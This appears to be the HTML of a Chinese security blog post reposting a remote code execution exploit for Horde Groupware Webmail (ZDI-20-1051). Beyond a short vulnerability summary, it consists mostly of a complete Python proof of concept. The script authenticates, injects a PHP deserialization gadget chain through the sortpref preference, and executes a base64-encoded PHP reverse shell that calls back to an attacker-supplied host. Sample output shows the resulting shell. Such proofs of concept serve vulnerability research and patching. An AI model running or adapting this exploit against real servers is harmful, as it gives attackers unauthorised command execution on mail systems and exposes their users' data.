@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Horde Groupware Webmail 远程命令执行漏洞一、漏洞简介Horde GroupwareWebmail是美国Horde公司的一套基于浏览器的企业级通信套件。Horde GroupwareWebmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。 二、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Horde Groupware Webmail 远程命令执行漏洞一、漏洞简介Horde GroupwareWebmail是美国Horde公司的一套基于浏览器的企业级通信套件。Horde GroupwareWebmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。 二、">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:57.322Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Horde Groupware Webmail/Horde Groupware Webmail 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.322Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Horde-Groupware-Webmail-远程命令执行漏洞"><a href="#Horde-Groupware-Webmail-远程命令执行漏洞" class="headerlink" title="Horde Groupware Webmail 远程命令执行漏洞"></a>Horde Groupware Webmail 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Horde Groupware<br>Webmail是美国Horde公司的一套基于浏览器的企业级通信套件。Horde Groupware<br>Webmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>saturn:~ mr_me$ ./poc.py
+(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;
+(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+ 
+saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+(+) targeting http://172.16.175.145/horde/
+(+) obtained session iefankvohbl8og0mtaadm3efb6
+(+) inserted our php object
+(+) triggering deserialization...
+(+) starting handler on port 1337
+(+) connection from 172.16.175.145
+(+) pop thy shell!
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd
+/var/www/horde/services
+uname -a
+Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux
+exit
+*** Connection closed by remote host ***
+(+) repaired the target!
+</code></pre>
+<blockquote>
+<p>poc.py</p>
+</blockquote>
+<pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability
+
+Identifiers: ZDI-CAN-10436 / ZDI-20-1051
+Found by ..: mr_me
+Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33
+
+Summary:
+========
+
+It&#39;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py
+(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;
+(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+
+saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+(+) targeting http://172.16.175.145/horde/
+(+) obtained session iefankvohbl8og0mtaadm3efb6
+(+) inserted our php object
+(+) triggering deserialization...
+(+) starting handler on port 1337
+(+) connection from 172.16.175.145
+(+) pop thy shell!
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd
+/var/www/horde/services
+uname -a
+Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux
+exit
+*** Connection closed by remote host ***
+(+) repaired the target!
+&quot;&quot;&quot;
+
+
+import re
+import sys
+import socket
+import requests
+import telnetlib
+import base64
+from threading import Thread
+
+def rs(cbh, cbp):
+    return &quot;&quot;&quot;@error_reporting(-1);
+@set_time_limit(0); 
+@ignore_user_abort(1);
+$dis=@ini_get(&#39;disable_functions&#39;);
+if(!empty($dis))&#123;
+    $dis=preg_replace(&#39;/[, ]+/&#39;, &#39;,&#39;, $dis);
+    $dis=explode(&#39;,&#39;, $dis);
+    $dis=array_map(&#39;trim&#39;, $dis);
+&#125;else&#123;
+    $dis=array();
+&#125;
+$ipaddr=&#39;%s&#39;;
+$port=%d;
+function PtdSlhY($c)&#123;
+    global $dis; 
+    if (FALSE !== strpos(strtolower(PHP_OS), &#39;win&#39; )) &#123;
+        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;
+    &#125;
+    ob_start();
+    system($c);
+    $o=ob_get_contents();
+    ob_end_clean();
+    if (strlen($o) === 0)&#123;
+        $o = &quot;NULL&quot;;
+    &#125;
+    return $o;
+&#125;
+$nofuncs=&#39;no exec functions&#39;;
+$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);
+while($c=fread($s,2048))&#123;
+    $out = &#39;&#39;;
+    if(substr($c,0,3) == &#39;cd &#39;)&#123;
+        chdir(substr($c,3,-1));
+    &#125;else if (substr($c,0,4) == &#39;quit&#39; || substr($c,0,4) == &#39;exit&#39;) &#123;
+        break;
+    &#125;else&#123;
+        $out=PtdSlhY(substr($c,0,-1));
+        if($out===false)&#123;
+            fwrite($s, $nofuncs);
+            break;
+        &#125;
+    &#125;
+    fwrite($s,$out);
+&#125;
+fclose($s);&quot;&quot;&quot; % (cbh, cbp)
+
+def get_session(t, p, usr, pwd):
+    uri = &quot;http://%s%slogin.php&quot; % (t, p)
+    p = &#123;
+        &quot;login_post&quot; : 1337,
+        &quot;horde_user&quot; : usr,
+        &quot;horde_pass&quot; : pwd
+    &#125;
+    r = requests.post(uri, data=p, allow_redirects=False)
+    match = re.findall(&quot;Horde=(.&#123;26&#125;);&quot;, r.headers[&#39;set-cookie&#39;])
+    assert len(match) == 2, &quot;(-) failed to login&quot;
+    return match[1]
+
+def trigger_deserialization(t, p, s, host, port):
+    &quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;
+    handlerthr = Thread(target=handler, args=(port,))
+    handlerthr.start()
+    uri = &quot;http://%s%sservices/ajax.php/imp/imple&quot; % (t, p)
+    p = &#123;
+        &quot;imple&quot; : &quot;IMP_Prefs_Sort&quot;,
+        &quot;app&quot; : &quot;imp&quot;,
+    &#125;
+    h = &#123; &quot;cmd&quot; : base64.b64encode(rs(host, port).encode()) &#125;
+    c = &#123; &quot;Horde&quot; : s &#125;
+    r = requests.get(uri, params=p, cookies=c, headers=h)
+    match = re.search(&quot;horde_logout_token=(.*)&amp;&quot;, r.text)
+    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;
+    p[&#39;token&#39;] = match.group(1)
+    r = requests.get(uri, params=p, cookies=c, headers=h)
+    assert r.status_code == 200, &quot;(-) failed to trigger deserialization!&quot;
+
+def get_pop():
+    &quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;
+    pop  = &#39;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#39;
+    pop += &#39;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#39;
+    pop += &#39;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#39;
+    pop += &#39;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#39;
+    pop += &#39;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#39;
+    pop += &#39;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#39;
+    pop += &#39;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#39;
+    pop += &#39;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#39;
+    pop += &#39;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#39;  # implements Serializable using custom unserialize/serialize
+    pop += &#39;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#39;
+    pop += &#39;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;             # additional checks
+    pop += &#39;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;
+    return pop
+
+def get_patch():
+    &quot;&quot;&quot; Our original array &quot;&quot;&quot;
+    patch  = &#39;a:1:&#123;&#39;
+    patch += &#39;s:5:&quot;INBOX&quot;;a:1:&#123;&#39;
+    patch += &#39;s:1:&quot;b&quot;;i:6;&#39;
+    patch += &#39;&#125;&#125;&#39;
+    return patch
+
+def set_pref(t, p, s, k, o):
+    &quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;
+    uri = &quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot; % (t, p)
+    p = &#123;
+        &quot;pref&quot; : k,
+        &quot;value&quot; : o,
+    &#125;
+    c = &#123; &quot;Horde&quot; : s &#125;
+    r = requests.get(uri, params=p, cookies=c)
+    match = re.search(&quot;horde_logout_token=(.*)&amp;&quot;, r.text)
+    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;
+    p[&#39;token&#39;] = match.group(1)
+    r = requests.get(uri, params=p, cookies=c)
+    assert (&quot;\&quot;response\&quot;:true&quot; in r.text and r.status_code == 200), &quot;(-) failed to set the preference!&quot;
+
+def handler(lport):
+    print(&quot;(+) starting handler on port %d&quot; % lport)
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((&quot;0.0.0.0&quot;, lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(&quot;(+) connection from %s&quot; % addr[0])
+    t.sock = conn
+    print(&quot;(+) pop thy shell!&quot;)
+    t.interact()
+
+def fix_path(p):
+    if p == &quot;/&quot;:
+        return p
+    if not p.startswith(&quot;/&quot;):
+        p = &quot;/%s&quot; % p
+    if not p.endswith(&quot;/&quot;):
+        p = &quot;%s/&quot; % p
+    return p
+
+def main():
+    if len(sys.argv) &lt; 5:
+        print(&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot; % sys.argv[0])
+        print(&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot; % sys.argv[0])
+        sys.exit(0)
+    target = sys.argv[1]
+    path   = fix_path(sys.argv[2])
+    user   = sys.argv[3].split(&quot;:&quot;)[0]
+    pswd   = sys.argv[3].split(&quot;:&quot;)[1]
+    host   = sys.argv[4].split(&quot;:&quot;)[0]
+    port   = int(sys.argv[4].split(&quot;:&quot;)[1])
+    print(&quot;(+) targeting http://%s%s&quot; % (target, path))
+    session = get_session(target, path, user, pswd)
+    print(&quot;(+) obtained session %s&quot; % session)
+    set_pref(target, path, session, &#39;sortpref&#39;, get_pop())
+    print(&quot;(+) inserted our php object&quot;)
+    print(&quot;(+) triggering deserialization...&quot;)
+    trigger_deserialization(target, path, session, host, port)
+    set_pref(target, path, session, &#39;sortpref&#39;, get_patch())
+    print(&quot;(+) repaired the target!&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqs1008ry8v12fpc7gdj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/IBOS/IBOS%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
